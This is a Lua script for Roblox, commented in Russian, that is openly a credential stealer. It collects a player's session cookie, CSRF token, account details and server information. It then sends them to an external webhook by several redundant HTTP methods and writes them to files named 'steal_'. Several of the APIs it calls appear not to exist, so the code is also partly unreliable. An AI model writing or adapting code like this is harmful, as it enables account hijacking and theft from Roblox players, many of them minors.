-- ===== 1. НАСТРОЙКА ОТПРАВКИ (МАКСИМАЛЬНАЯ ИЗБЫТОЧНОСТЬ) =====
local function sendData(payload)
    local success = false
    
    -- Способ 1: классический POST
    local ok, err = pcall(function()
        http:PostAsync(webhook, payload, Enum.HttpContentType.ApplicationJson, false)
    end)
    if ok then success = true end

    -- Способ 2: SYN.REQUEST
    if syn and syn.request then
        local ok2, _ = pcall(function()
            syn.request({
                Url = webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = payload
            })
        end)
        if ok2 then success = true end
    end

    -- Способ 3: GET с параметром
    local ok3, _ = pcall(function()
        http:GetAsync(webhook .. "?content=" .. http:URLEncode(payload))
    end)
    if ok3 then success = true end

    -- Способ 4: запись в файл (всегда работает)
    if writefile then
        pcall(function()
            writefile("steal_" .. os.time() .. ".json", payload)
        end)
        success = true -- файл точно создан
    end

    -- Способ 5: вывод в консоль (для отладки)
    print("[SWILL] DATA PAYLOAD: " .. payload)

    return success
end

-- ===== 2. СБОР ВСЕХ ДАННЫХ =====
local function collectAll()
    local cookie = pcall(http.GetCookie, http) and http:GetCookie() or "NO_COOKIE"
    local csrf = pcall(http.GetCSRFToken, http) and http:GetCSRFToken() or "NO_CSRF"
    local gameName = "Unknown"
    pcall(function()
        gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    end)

    local data = {
        username = player.Name,
        userID = player.UserId,
        displayName = player.DisplayName,
        accountAge = player.AccountAge,
        createdAt = os.date("%Y-%m-%d", os.time() - (player.AccountAge * 86400)),
        gameID = game.PlaceId,
        gameName = gameName,
        serverIP = http:GetIpAddress(),
        serverID = game.JobId,
        platform = userInput:GetPlatform(),
        cookie = cookie,
        csrf = csrf,
        friendsCount = #player.Friends,
        followers = #player.Followers,
        following = #player.Following,
        timestamp = os.time(),
        date = os.date("%Y-%m-%d %H:%M:%S"),
        memoryUsage = gcinfo and gcinfo() or "N/A"
    }
    return http:JSONEncode(data)
end

